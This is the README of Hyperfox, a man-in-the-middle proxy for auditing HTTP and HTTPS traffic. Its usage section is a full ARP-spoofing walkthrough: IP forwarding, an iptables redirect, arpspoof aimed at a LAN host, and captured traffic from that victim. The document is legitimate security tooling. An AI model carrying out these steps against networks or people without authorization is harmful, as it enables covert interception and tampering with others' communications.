# Hyperfox

Hyperfox is a security tool for Man In The Middle operations over HTTP and
HTTPs.

Hyperfox can be used as a tool for auditing a wide range of applications,
including mobile applications that do not properly verify certificates or that
do not use certificates at all.

The `hyperfox` tool is a default distribution of the Hyperfox proxy.

Hyperfox can also be used as a library to develop special proxies with [Go][1],
if you're interested on programming a special proxy for any special MITM
operation you may read the library documentation at [godoc.org][6].

## Features of the Hyperfox tool

The Hyperfox tool has some useful features:

* Saves all the traffic between client and server.
* Can modify server responses before arriving to the client.
* Can modify client requests before sending them to the destination server.
* Supports SSL/TLS.
* Supports streaming.

## Getting Hyperfox

You can download a pre-compiled binary of the Hyperfox tool:

* [Linux x86_64](https://menteslibres.net/files/hyperfox/hyperfox-1.0-linux-x64)
* [OSX x86_64](https://menteslibres.net/files/hyperfox/hyperfox-1.0-darwin-x64)

Once you've downloaded the appropriate binary move it to `$HOME/bin/hyperfox`
and call it using the full path:

```
$ ~/bin/hyperfox -h
```

If you have `$HOME/bin` in your `$PATH`, you may as well call `hyperfox`
without the full path:

```
$ hyperfox -h
```

If you have [Go][1] and [git][2] you can use `go get` to download the source
and compile the Hyperfox tool by yourself:

```sh
$ go get github.com/xiam/hyperfox
$ hyperfox -h
```

## Usage example

I. Make sure the [dsniff][5] tool is installed in the MITM machine, we are
going to use the `arpspoof` tool (part of [dsniff][5]) to alter the ARP table
of a specific machine on LAN to make it redirect its traffic to us instead of
to the legitimate LAN gateway. This ancient technique is known as
[ARP spoofing][4].

II. Identify the LAN IP of the machine you want to intercept traffic for. Let's
suppose you want to intercept traffic from `10.0.0.146`.

III. Identify the IP of your router and the name of the interface you're
connected with, let's say your router is `10.0.0.1` and you're connected to
the router through `wlan0`.

```
$ sudo route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.0.0.1        0.0.0.0         UG    0      0        0 wlan0
```

IV. Put the MITM machine in [IP forwarding][3] mode.

```sh
# Linux
$ sudo sysctl -w net.ipv4.ip_forward=1

# FreeBSD/OSX
$ sudo sysctl -w net.inet.ip.forwarding=1
```

V. Run hyperfox (as a normal, unprivileged user) within a writable directory:

```
$ mkdir -p ~/tmp/hyperfox-session
$ cd ~/tmp/hyperfox-session
$ hyperfox
2013/08/25 08:21:36 Hyperfox tool, by Carlos Reventlov.
2013/08/25 08:21:36 http://www.reventlov.com

2013/08/25 08:21:36 Listening for HTTP client requests at 0.0.0.0:9999.
```

If you want to analyze HTTPs instead of HTTP, use the `-s` flag and provide
appropriate
[cert.pem](https://github.com/xiam/hyperfox/raw/master/ssl/cert.pem) and
[key.pem](https://github.com/xiam/hyperfox/raw/master/ssl/key.pem) files.

```sh
$ hyperfox -s -c ssl/cert.pem -k ssl/key.pem
```

VI. Prepare the machine to forward everything but the port hyperfox will
intercept (`80`, for plain HTTP), instead tell it to forward the traffic on
port `80` to the `9999` port on `127.0.0.1` (where `hyperfox` is listening).

```sh
# Linux (HTTP)
$ sudo iptables -A PREROUTING -t nat -i wlan0 -p tcp --destination-port 80 -j \
REDIRECT --to-port 9999

# FreeBSD/OSX (HTTP)
$ sudo ipfw add fwd 127.0.0.1,9999 tcp from any to any 80 via wlan0
```

VII. Run `arpspoof` to make `10.0.0.146` think our host is `10.0.0.1` (the
LAN's legitimate gateway), once the ARP spoofing is completed, `10.0.0.146` will
start to send its traffic through our machine.

```sh
$ sudo arpspoof -i wlan0 -t 10.0.0.146 10.0.0.1
```

VIII. !???

IX. Profit!!

Once `192.168.1.146` starts to send some traffic, a `capture` directory will
be created:

```
$ cd ~/tmp/hyperfox-session
$ ls
capture
$ cd capture
$ find .
./client
./client/10.0.0.146
./client/10.0.0.146/a.adcloud.net
./client/10.0.0.146/a.adcloud.net/adcloud
./client/10.0.0.146/a.adcloud.net/adcloud/12345
./client/10.0.0.146/a.adcloud.net/adcloud/12345/GET-20130825-133421-734021699.head
./client/10.0.0.146/a.adcloud.net/adcloud/12345/GET-20130825-133421-734021699
...
./server
./server/10.0.0.146
./server/10.0.0.146/a.adcloud.net
./server/10.0.0.146/a.adcloud.net/adcloud
./server/10.0.0.146/a.adcloud.net/adcloud/12345
./server/10.0.0.146/a.adcloud.net/adcloud/12345/GET-20130825-133421-734021699.head
./server/10.0.0.146/a.adcloud.net/adcloud/12345/GET-20130825-133421-734021699
./server/10.0.0.146/a.adcloud.net/adcloud/12345/GET-20130825-133421-734021699.body
...
```

You can see whatever is happening by watching hyperfox's output:

```
-> 10.0.0.146:61716 m.vanityfair.com: GET /business/features/2011/05/paul-allen-201105 HTTP/1.1 0b
<- 10.0.0.146:61716 m.vanityfair.com: GET /business/features/2011/05/paul-allen-201105 HTTP/1.1 -1b 200
-> 10.0.0.146:61716 m.vanityfair.com: GET /static/css/mobify.css?1335486443 HTTP/1.1 0b
-> 10.0.0.146:61717 m.vanityfair.com: GET /static/mcss/561/stag-carmot-vf.css?1370835026 HTTP/1.1 0b
-> 10.0.0.146:61718 www.vanityfair.com: GET /etc/clientlibs/foundation/jquery.js HTTP/1.1 0b
-> 10.0.0.146:61719 dl.dropbox.com: GET /u/123456/vf-mobile/js/cn.mobifycore.js HTTP/1.1 0b
<- 10.0.0.146:61718 www.vanityfair.com: GET /etc/clientlibs/foundation/jquery.js HTTP/1.1 0b 304
```

## License

> Copyright (c) 2012-2013 José Carlos Nieto, https://menteslibres.net/xiam
>
> Permission is hereby granted, free of charge, to any person obtaining
> a copy of this software and associated documentation files (the
> "Software"), to deal in the Software without restriction, including
> without limitation the rights to use, copy, modify, merge, publish,
> distribute, sublicense, and/or sell copies of the Software, and to
> permit persons to whom the Software is furnished to do so, subject to
> the following conditions:
>
> The above copyright notice and this permission notice shall be
> included in all copies or substantial portions of the Software.
>
> THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
> EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
> MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
> NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
> LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
> OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
> WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

[1]: http://golang.org/doc/install
[2]: http://git-scm.com
[3]: http://en.wikipedia.org/wiki/IP_forwarding
[4]: http://en.wikipedia.org/wiki/ARP_spoofing
[5]: http://monkey.org/~dugsong/dsniff/
[6]: http://godoc.org/github.com/xiam/hyperfox/proxy
